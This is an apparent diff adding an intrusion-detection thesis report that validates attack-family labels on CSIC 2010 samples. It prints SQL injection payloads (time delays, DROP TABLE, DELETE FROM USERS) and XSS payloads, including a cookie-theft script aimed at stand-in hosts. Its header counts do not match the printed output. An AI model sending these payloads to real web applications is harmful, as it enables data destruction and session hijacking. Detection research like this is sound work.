@@ -1,0 +1,275 @@
+
+==============================================================================
+VALIDACAO DA ATRIBUICAO HEURISTICA DE FAMILIA DE ATAQUE
+==============================================================================
+Por que eu escrevi este script:
+
+O recall por familia se tornou o resultado principal do meu trabalho (SQLi 99,1%,
+XSS 100,0%). Mas o CSIC 2010 rotula apenas normal/anomalo, sem tipo de ataque --
+a atribuicao de familia e minha, por heuristica de regex em
+classificar_familia_ataque(). Se essa heuristica estiver errada, o meu resultado
+principal desmorona.
+
+Entao eu validei manualmente. Este script extrai a MESMA amostra que eu inspecionei
+(semente fixa), para que qualquer pessoa da banca possa reproduzir a extracao e
+conferir os meus vereditos, registrados em docs/validacao_familias.md.
+
+Rodar:  python validar_familias.py
+        python validar_familias.py --n 40         (amostra maior)
+        python validar_familias.py --templates    (so a analise de templates)
+
+RESULTADO DA MINHA VALIDACAO: 40/40 corretas (20 SQLi + 20 XSS).
+
+O QUE A VALIDACAO REVELOU DE INESPERADO
+Os 468 payloads de SQLi derivam de apenas 8 templates distintos, e os 472 de XSS
+de apenas 4. Ou seja, o recall de 99,6% mede a deteccao de ~12 templates injetados
+em 7 combinacoes de parametros ao longo de 8 rotas -- nao de 940 ataques
+estruturalmente diferentes. Essa e uma limitacao do dataset que eu preciso declarar,
+e ela torna o experimento de leave-one-template-out viavel e necessario.
+==============================================================================
+
+
+====================================================================================================
+SQLi: 25 amostras de 1018 (random_state=7)
+====================================================================================================
+
+# 1 [GET] /tienda1/publico/autenticar.jsp  (len=85)
+    modo=entrar&login=mobley&pwd=r10bo9b7&remember=');waitfor delay '0:0:15';--&B1=Entrar
+    -> template: "');waitfor delay '0:0:15';--"
+
+# 2 [GET] /tienda1/publico/caracteristicas.jsp  (len=32)
+    id=1');waitfor delay '0:0:15';--
+    -> template: "');waitfor delay '0:0:15';--"
+
+# 3 [GET] /tienda1/publico/autenticar.jsp  (len=104)
+    modo=entrar&login=girouard&pwd=Disgu5TAd1','0','0','0');waitfor delay '0:0:15';--&remember=off&B1=Entrar
+    -> template: "','0','0','0');waitfor delay '0:0:15';--"
+
+# 4 [POST] /tienda1/publico/anadir.jsp  (len=93)
+    id=');waitfor delay '0:0:15';--&nombre=Vino Rioja&precio=100&cantidad=17&B1=Añadir al carrito
+    -> template: "');waitfor delay '0:0:15';--"
+
+# 5 [GET] /tienda1/publico/autenticar.jsp  (len=86)
+    modo=entrar&login=hope&pwd=infR06g9ble&remember=');waitfor delay '0:0:15';--&B1=Entrar
+    -> template: "');waitfor delay '0:0:15';--"
+
+# 6 [POST] /tienda1/publico/anadir.jsp  (len=84)
+    id=1&nombre=Vino Rioja&precio=39&cantidad=70' DELETE FROM USERS&B1=Añadir al carrito
+    -> template: "' DELETE FROM USERS"
+
+# 7 [POST] /tienda1/publico/pagar.jsp  (len=62)
+    modo=','0');waitfor delay '0:0:15';--&precio=8384&B1=Confirmar
+    -> template: "','0');waitfor delay '0:0:15';--"
+
+# 8 [GET] /tienda1/publico/pagar.jsp  (len=48)
+    modo=' DELETE FROM USERS&precio=806&B1=Confirmar
+    -> template: "' DELETE FROM USERS"
+
+# 9 [GET] /tienda1/publico/registro.jsp  (len=280)
+    modo=registro&login=lachance&password=su5a&nombre=Rogato&apellidos=Cucarell Caridad&email=zmed@tabernarinconete.uk&dni=19477061V';waitfor delay '0:0:15';--&direccion=Manuel Paez Xaramillo 33, 6B&ciudad=Estella/Lizarra&cp=26321&provincia=Tarragona&ntc=9995470732934706&B1=Registrar
+    -> template: "';waitfor delay '0:0:15';--"
+
+#10 [POST] /tienda1/publico/autenticar.jsp  (len=89)
+    modo=entrar&login=jasver9');waitfor delay '0:0:15';--&pwd=76r9v3t2&remember=off&B1=Entrar
+    -> template: "');waitfor delay '0:0:15';--"
+
+#11 [GET] /tienda1/publico/autenticar.jsp  (len=88)
+    modo=entrar&login=boehlke&pwd=retahíla';waitfor delay '0:0:15';--&remember=off&B1=Entrar
+    -> template: "';waitfor delay '0:0:15';--"
+
+#12 [POST] /tienda1/publico/entrar.jsp  (len=73)
+    errorMsg=Credenciales incorrectas','0','0','0');waitfor delay '0:0:15';--
+    -> template: "','0','0','0');waitfor delay '0:0:15';--"
+
+#13 [GET] /tienda1/publico/pagar.jsp  (len=66)
+    modo=insertar&precio=','0');waitfor delay '0:0:15';--&B1=Confirmar
+    -> template: "','0');waitfor delay '0:0:15';--"
+
+#14 [POST] /tienda1/publico/registro.jsp  (len=284)
+    modo=registro&login=gray&password=2s4e49&nombre=Sadao&apellidos=Mengual Bartumeu&email=mckinnell@arvigar.eu&dni=43595909F&direccion=Calle Arenal 153, &ciudad=Hornos de Moncalvillo','0','0','0','0');waitfor delay '0:0:15';--&cp=34349&provincia=Granada&ntc=4118559502333875&B1=Registrar
+    -> template: "','0','0','0','0');waitfor delay '0:0:15';--"
+
+#15 [GET] /tienda1/publico/registro.jsp  (len=305)
+    modo=registro&login=detlef6'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '%&password=garrón&nombre=Vigilio&apellidos=Alcantara Campanin&email=padamsee@comodindelhogar.no&dni=71599604Y&direccion=C/ San Xoan 115 &ciudad=Ciguñuela&cp=25737&provincia=Palencia&ntc=7263738765493624&B1=Registrar
+    -> template: "'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '%"
+
+#16 [GET] /tienda1/publico/registro.jsp  (len=281)
+    modo=registro&login=diahann&password=mARcel_iNo&nombre=Asad&apellidos=Tonato Valle&email=grizzard@ytv.com.mv&dni=75976186X&direccion=C/ Juan De Lara 115, 9?A&ciudad=Mazcuerras','0','0','0','0');waitfor delay '0:0:15';--&cp=43393&provincia=Valencia&ntc=8430846550683709&B1=Registrar
+    -> template: "','0','0','0','0');waitfor delay '0:0:15';--"
+
+#17 [POST] /tienda1/publico/registro.jsp  (len=296)
+    modo=registro&login=kundert&password=monesca&nombre=Ante&apellidos=Altirriba Pava&email=lowry-carmine@filtraciondehumos.nc&dni=70212042B&direccion=C/ Mercurio 165 4E&ciudad=San Martín de la Virgen de Moncayo&cp=03773&provincia=Navarra&ntc=9471070680051511&B1=Registrar');waitfor delay '0:0:15';--
+    -> template: "');waitfor delay '0:0:15';--"
+
+#18 [GET] /tienda1/miembros/editar.jsp  (len=297)
+    modo=registro&login=holliday&password=MurMURear','0');waitfor delay '0:0:15';--&nombre=Valfredo&apellidos=De Bethencourt Zuebieta&email=hollen_farber@bacoespecialselección.bu&dni=59258073E&direccion=Calle Santa Rosalia 40, &ciudad=Lecrín&cp=26322&provincia=Burgos&ntc=5577667999054954&B1=Registrar
+    -> template: "','0');waitfor delay '0:0:15';--"
+
+#19 [POST] /tienda1/publico/vaciar.jsp  (len=31)
+    B2=');waitfor delay '0:0:15';--
+    -> template: "');waitfor delay '0:0:15';--"
+
+#20 [GET] /tienda1/publico/vaciar.jsp  (len=35)
+    B2=','0');waitfor delay '0:0:15';--
+    -> template: "','0');waitfor delay '0:0:15';--"
+
+#21 [POST] /tienda1/miembros/editar.jsp  (len=314)
+    modo=registro&login=bennet&password=$96c5sa&nombre=Sid&apellidos=Echegoyen Pazarán&email=senghor-golling3@24htranslations.ht&dni=16864786J&direccion=Barriada De La Doctora 15 &ciudad=Roa&cp=03610'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '%&provincia=Valladolid&ntc=0695001148270797&B1=Registrar
+    -> template: "'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '%"
+
+#22 [GET] /tienda1/publico/pagar.jsp  (len=70)
+    modo=insertar&precio=5698&B1=Pasar por caja';waitfor delay '0:0:15';--
+    -> template: "';waitfor delay '0:0:15';--"
+
+#23 [GET] /tienda1/publico/pagar.jsp  (len=79)
+    modo=insertar&precio=9853&B1=Pasar por caja','0','0');waitfor delay '0:0:15';--
+    -> template: "','0','0');waitfor delay '0:0:15';--"
+
+#24 [POST] /tienda1/publico/pagar.jsp  (len=62)
+    modo=insertar' DELETE FROM USERS&precio=5781&B1=Pasar por caja
+    -> template: "' DELETE FROM USERS"
+
+#25 [POST] /tienda1/publico/anadir.jsp  (len=90)
+    id=';waitfor delay '0:0:15';--&nombre=Vino Rioja&precio=39&cantidad=1&B1=Añadir al carrito
+    -> template: "';waitfor delay '0:0:15';--"
+
+====================================================================================================
+XSS: 25 amostras de 952 (random_state=7)
+====================================================================================================
+
+# 1 [GET] /tienda1/publico/pagar.jsp  (len=172)
+    modo=insertar&precio=6908&B1=Confirmarsessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script>
+    -> template: "<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</sc"
+
+# 2 [GET] /tienda1/publico/autenticar.jsp  (len=122)
+    modo=entrar&login=junibob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&pwd=8EsCR1BIr&remember=on&B1=Entrar
+    -> TEMPLATE NAO IDENTIFICADO (inspecionar manualmente)
+
+# 3 [POST] /tienda1/publico/autenticar.jsp  (len=138)
+    modo=paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2&login=rickrd&pwd=p3nde3e-t8&remember=off&B1=Entrar
+    -> TEMPLATE NAO IDENTIFICADO (inspecionar manualmente)
+
+# 4 [POST] /tienda1/publico/autenticar.jsp  (len=400)
+    modo=sessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E?&login=jerhuang&pwd=5é4o4A&remember=off&B1=Entrar
+    -> TEMPLATE NAO IDENTIFICADO (inspecionar manualmente)
+
+# 5 [GET] /tienda1/publico/pagar.jsp  (len=104)
+    modo=insertar&precio=4862paros%22%20style=%22background:url(javascript:alert('Paros'))&B1=Pasar por caja
+    -> template: "paros%22%20style=%22background:url(javascript:alert('Paros'))"
+
+# 6 [POST] /tienda1/publico/pagar.jsp  (len=384)
+    modo=insertar&precio=7646sessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E?&B1=Confirmar
+    -> TEMPLATE NAO IDENTIFICADO (inspecionar manualmente)
+
+# 7 [POST] /tienda1/publico/registro.jsp  (len=371)
+    modo=registro&login=jada&password=0a3gan861&nombre=Asad&apellidos=sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script>&email=seward_sepulvede@promotorareina.bt&dni=05599581R&direccion=Cuesta Del Mercadillo, 30 &ciudad=Valdemeca&cp=44367&provincia=Palencia&ntc=2588788031004045&B1=Registrar
+    -> template: "<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</sc"
+
+# 8 [POST] /tienda1/publico/anadir.jsp  (len=147)
+    id=3&nombre=Vino Rioja&precio=85paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2&cantidad=71&B1=Añadir al carrito
+    -> TEMPLATE NAO IDENTIFICADO (inspecionar manualmente)
+
+# 9 [GET] /tienda1/publico/anadir.jsp  (len=130)
+    id=1&nombre=Queso Manchego&precio=39paros%22%20style=%22background:url(javascript:alert('Paros'))&cantidad=64&B1=Añadir al carrito
+    -> template: "paros%22%20style=%22background:url(javascript:alert('Paros'))"
+
+#10 [POST] /tienda1/publico/autenticar.jsp  (len=124)
+    modo=entrar&login=nevinbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&pwd=DEsGRADuAR&remember=on&B1=Entrar
+    -> TEMPLATE NAO IDENTIFICADO (inspecionar manualmente)
+
+#11 [POST] /tienda1/publico/autenticar.jsp  (len=120)
+    modo=entrar&login=valletparos%22%20style=%22background:url(javascript:alert('Paros'))&pwd=a1r6e0o9&remember=on&B1=Entrar
+    -> template: "paros%22%20style=%22background:url(javascript:alert('Paros'))"
+
+#12 [POST] /tienda1/miembros/editar.jsp  (len=594)
+    modo=registro&login=sessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E?&password=telégrafo&nombre=Alexia&apellidos=De Castro Wölker&email=jans@voragolive.do&dni=63653644V&direccion=Sanlucar La Mayor, 148, &ciudad=Atzeneta del Maestrat&cp=16270&provincia=Ciudad Real&ntc=5906206602610899&B1=Registrar
+    -> TEMPLATE NAO IDENTIFICADO (inspecionar manualmente)
+
+#13 [POST] /tienda1/miembros/editar.jsp  (len=307)
+    modo=registro&login=sastry&password=3l607LaDO2&nombre=Emmanuelle&apellidos=Gonyalon Salobreña&email=bernt@wdsl.yu&dni=82709891Mparos%22%20style=%22background:url(javascript:alert('Paros'))&direccion=Calle Poligono San Pablo 143 6-D&ciudad=Gaztelu&cp=29711&provincia=Granada&ntc=6789852392757283&B1=Registrar
+    -> template: "paros%22%20style=%22background:url(javascript:alert('Paros'))"
+
+#14 [POST] /tienda1/publico/vaciar.jsp  (len=67)
+    B2=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org
+    -> TEMPLATE NAO IDENTIFICADO (inspecionar manualmente)
+
+#15 [GET] /tienda1/miembros/editar.jsp  (len=289)
+    modo=registro&login=buffett&password=vejete&nombre=Zoeli&apellidos=Navas Gorriz&email=lowler-hoi-shan6@webgune.bj&dni=90025435P&direccion=Cabrera, 153 7?A&ciudad=Santa María de Ordás&cp=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&provincia=Lleida&ntc=9769918811334498&B1=Registrar
+    -> TEMPLATE NAO IDENTIFICADO (inspecionar manualmente)
+
+#16 [GET] /tienda1/publico/entrar.jsp  (len=355)
+    errorMsg=sessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E?
+    -> TEMPLATE NAO IDENTIFICADO (inspecionar manualmente)
+
+#17 [POST] /tienda1/publico/registro.jsp  (len=327)
+    modo=registro&login=poliwoda&password=enigmatista&nombre=Tarciano&apellidos=Camí Tordera&email=nardo@codwatw.lk&dni=08762650H&direccion=Federico Landrove Moiño 105 3-G&ciudad=Goizueta&cp=19360&provincia=Alicanteparos%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2&ntc=7171983347621063&B1=Registrar
+    -> TEMPLATE NAO IDENTIFICADO (inspecionar manualmente)
+
+#18 [GET] /tienda1/publico/anadir.jsp  (len=101)
+    id=2&nombre=Jamón Ibérico&precio=100&cantidad=57<SCRIPT>alert("Paros");</SCRIPT>&B1=Añadir al carrito
+    -> template: '<SCRIPT>alert("Paros");</SCRIPT>'
+
+#19 [POST] /tienda1/publico/anadir.jsp  (len=118)
+    id=2&nombre=Jamón Ibérico&precio=85&cantidad=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&B1=Añadir al carrito
+    -> TEMPLATE NAO IDENTIFICADO (inspecionar manualmente)
+
+#20 [GET] /tienda1/publico/anadir.jsp  (len=112)
+    id=bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org&nombre=Vino Rioja&precio=85&cantidad=61&B1=Añadir al carrito
+    -> template: 'bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org'
+
+#21 [POST] /tienda1/publico/autenticar.jsp  (len=113)
+    modo=entrar&login=skillen&pwd=pluTocracia&remember=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&B1=Entrar
+    -> TEMPLATE NAO IDENTIFICADO (inspecionar manualmente)
+
+#22 [POST] /tienda1/publico/anadir.jsp  (len=97)
+    id=1&nombre=Vino Rioja&precio=85&cantidad=80<SCRIPT>alert("Paros");</SCRIPT>&B1=Añadir al carrito
+    -> template: '<SCRIPT>alert("Paros");</SCRIPT>'
+
+#23 [GET] /tienda1/publico/caracteristicas.jsp  (len=86)
+    id=1paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2
+    -> TEMPLATE NAO IDENTIFICADO (inspecionar manualmente)
+
+#24 [POST] /tienda1/publico/anadir.jsp  (len=111)
+    id=3&nombre=Vino Rioja&precio=bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org&cantidad=41&B1=Añadir al carrito
+    -> template: 'bob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org'
+
+#25 [POST] /tienda1/miembros/editar.jsp  (len=570)
+    modo=registro&login=sha-wen&password=aeronato&nombre=Rudy&apellidos=Riviere&email=pilato0@lettere.aero&dni=68312371W&direccion=Pl. Ochavo 19 &ciudad=Santa María del Campo&cp=37799&provincia=Guipúzcoa&ntc=7225503752888118&B1=sessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E?
+    -> TEMPLATE NAO IDENTIFICADO (inspecionar manualmente)
+
+====================================================================================================
+DIVERSIDADE DE TEMPLATES DE ATAQUE
+====================================================================================================
+A contagem de amostras nao equivale a diversidade de ataques: o CSIC injeta
+um punhado de payloads em muitos campos diferentes.
+
+SQLi: 1018 amostras -> 13 templates distintos (0 nao identificados)
+      168x  '; drop table usuarios; select * from datos where nombre like '%
+      138x  ','0','0','0','0');waitfor delay '0:0:15';--
+      130x  ','0','0');waitfor delay '0:0:15';--
+      126x  ','0','0','0');waitfor delay '0:0:15';--
+      120x  ';waitfor delay '0:0:15';--
+      116x  ','0');waitfor delay '0:0:15';--
+      106x  ' delete from users
+      102x  ');waitfor delay '0:0:15';--
+        4x  0','0','0','0');waitfor delay '0:0:15';--
+        2x  0');waitfor delay '0:0:15';--
+        2x  0','0','0','0','0');waitfor delay '0:0:15';--
+        2x  00');waitfor delay '0:0:15';--
+        2x  00','0','0','0');waitfor delay '0:0:15';--
+    injetados em 7 combinacoes de parametros, ao longo de 8 rotas
+
+XSS: 952 amostras -> 4 templates distintos (480 nao identificados)
+      132x  <script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ documen
+      116x  bob@<script>alert(paros)</script>.parosproxy.org
+      116x  paros%22%20style=%22background:url(javascript:alert('paros'))
+      108x  <script>alert("paros");</script>
+    injetados em 7 combinacoes de parametros, ao longo de 8 rotas
+
+CONSEQUENCIA QUE EU DECLARO: o recall de 99,6% em SQLi+XSS mede a deteccao
+de ~12 templates, nao de 940 ataques estruturalmente distintos. Com tao
+poucos templates, o experimento de leave-one-template-out (treinar sem um
+template e testar so nele) e viavel e passa a ser indispensavel para eu
+afirmar qualquer coisa sobre generalizacao.
+
+Meus vereditos manuais estao em docs/validacao_familias.md
